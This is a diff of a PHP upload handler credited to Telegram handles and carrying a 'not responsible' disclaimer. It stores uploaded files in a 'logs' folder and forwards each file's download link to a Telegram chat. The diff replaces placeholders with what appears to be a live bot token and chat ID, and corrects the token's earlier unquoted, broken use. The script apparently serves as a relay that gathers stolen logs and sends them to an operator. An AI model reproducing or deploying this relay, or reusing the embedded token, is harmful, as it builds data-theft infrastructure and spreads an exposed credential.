@@ -4,8 +4,8 @@
 	Coded by https://t.me/reyvortex & https://t.me/TheDyer
 	!WARNING! ALL CODE IS FOR INTRODUCTORY PURPOSES WE ARE NOT RESPONSIBLE FOR WHAT YOU HAVE DONE !WARNING!
 */
-define('BOT_TOKEN', 'YOUR TELEGRAM BOT TOKEN'); // Replace YOUR TELEGRAM BOT TOKEN to Your BotToken
-define('CHAT_ID', 'YOUR CHAT ID'); // Replace YOUR CHAT ID to Your Chat ID
+define('BOT_TOKEN', '7232013804:AAHnDMqAAPwbDY8OUrvA-DVpwZXNPMgMLPM'); // Replace YOUR TELEGRAM BOT TOKEN to Your BotToken
+define('CHAT_ID', '6170268179'); // Replace YOUR CHAT ID to Your Chat ID
 
 $uploadPath = __DIR__ . '/logs/';
 
@@ -46,9 +46,9 @@ if (isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
         $message = "Download URL: " . $fileUrl . "\n";
         $message .= "Info: " . $fileCaption;
 
-        $telegramApiUrl = 'https://api.telegram.org/bot' . 7232013804:AAHnDMqAAPwbDY8OUrvA-DVpwZXNPMgMLPM . '/sendMessage';
+        $telegramApiUrl = 'https://api.telegram.org/bot' . BOT_TOKEN . '/sendMessage';
         $postData = [
-            'chat_id' => 6170268179,
+            'chat_id' => CHAT_ID,
             'text' => $message
         ];
 
